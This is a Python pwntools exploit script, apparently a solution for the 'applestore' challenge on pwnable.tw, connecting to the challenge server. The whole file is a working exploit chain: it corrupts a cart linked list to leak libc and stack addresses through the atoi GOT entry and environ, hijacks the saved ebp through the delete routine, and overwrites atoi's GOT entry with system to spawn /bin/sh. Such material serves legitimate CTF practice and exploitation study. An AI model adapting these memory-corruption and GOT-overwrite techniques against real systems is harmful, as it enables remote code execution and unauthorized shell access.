#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./applestore_patched')
libc = ELF('./libc_32.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10104)

def add(num):
    sa('> ', '2')
    sa('Device Number> ', str(num))

def delete(idx):
    sa('> ', '3')
    sa('Item Number> ', idx)

def cart(c):
    sla('> ', '4')
    sa('Let me check your cart. ok? (y/n) > ', c)

def checkout(c):
    sa('> ', '5')
    sa('Let me check your cart. ok? (y/n) > ', c)

atoi_got = elf.got['atoi']
bss_buf = 0x804b110

# `./cal.py` => add a struct on stack
add(1)
for i in range(6):
    add(3)
add(4)
for i in range(18):
    add(5)
checkout('y')

# overwrite ptr to leak libc
#gdb.attach(p)
cart('y ' + up32(atoi_got) + up32(0) + up32(0)) # clean next pointer
ru('27: ')
libc_base = uu32(r(4)) - 0x2d050
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
info('binsh = ' + hex(binsh))
environ = libc_base + libc.sym['environ']

# overwrite ptr to leak stack
cart('y ' + up32(environ) + up32(0) + up32(0)) # clean next pointer
ru('27: ')
stack = uu32(r(4))
info('stack = ' + hex(stack))

# hijack ebp
#gdb.attach(p, 'b *0x08048A6F\nc')
delete('27' + up32(binsh) + up32(0) + up32(stack - 0x110) + up32(atoi_got + 0x22)) # set ebp = &atoi_got+0x22

# overwrite atoi_got
#gdb.attach(p, 'b *0x08048C0B\nb system\nc')
sa('> ', up32(system) + ';/bin/sh\x00')

p.interactive()

